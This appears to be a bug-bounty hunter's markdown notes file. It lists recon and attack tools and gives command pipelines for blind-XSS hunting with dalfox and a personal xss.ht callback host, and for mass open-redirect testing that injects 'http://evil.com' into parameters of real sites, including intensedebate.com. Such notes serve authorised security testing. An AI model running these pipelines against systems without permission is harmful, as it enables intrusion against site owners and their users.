- https://github.com/maurosoria/dirsearch
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/DanMcInerney/xsscrapy

- Burp Suite
- SecLists
- whatcms
- Striker
- OWASP ZAP
- Dirb
- Scrapy
- Dirbuster
- Gobuster
- Wfuzz
- CyberChef
- Sublist3r	
- Massdns
- Dnsenum
- Knockpy
- nmap 
- Masscan
- Sn1per
- XSStrike
- Sqlmap
- Wpscan
- Joomscan
- CMSmap
- Builtwith
- Wappalyzer
- wafw00f


- passive hunter
- a-mass
- subfinder
- httpx
- aquatone
- dalfox
- nuclei
- open redirect x
- massdns
- paramspider

### XSS Payloads (xsshunter)
- xalgord.xss.ht

## file upload vulnerability test
- https://github.com/epinna/weevely3

## XSS recon methodology
▶ cat domains.txt | waybackurls > urls

```
cat urls.txt        --> read the file
| kxss              --> filter special characters
| sed 's/=.*/=/'    --> remove everything after = ,add = 
| sed 's/URL: //'   --> remove URL: and white space
| dalfox pipe       --> dalfox tool for xss payload
-b xalgord.xss.ht   --> BXSS payload adder.
```

## Open Redirect Mass Hunt
- tool = ragno, qsreplace
```
python3 ragno.py -d intensedebate.com -s -q -o ragno_urls.txt
```
```
cat ragno_urls.txt | grep -a -i \=http | wc -w
```
```
cat ragno_urls.txt | grep -a -i \=http > potential_openredirect_vun.txt
```
```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" | wc -w
```
```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" > unique_potential_openredirect.txt
```
```
cat unique_potential_openredirect.txt | while read target_urls do; do curl -s -L $target_urls -I | grep "evil.com" && echo "[Vulnerable] $target_urls \n"; done
```



- Example: One Liner for Hunting Mass Open Redirect

```
python3 ragno.py -d test.vulnweb.com -s -q -o ragno_urls.txt | cat ragno_urls.txt | grep -a -i \=http | qsreplace "http://evil.com" | while read target_url do; do curl -s -L $target_url -I | grep "evil.com" && echo "[+] [Vulnerable] $target_url \n"; done

```


## Amass Command

```
amass enum -brute -o output.txt -d example.com -v
```
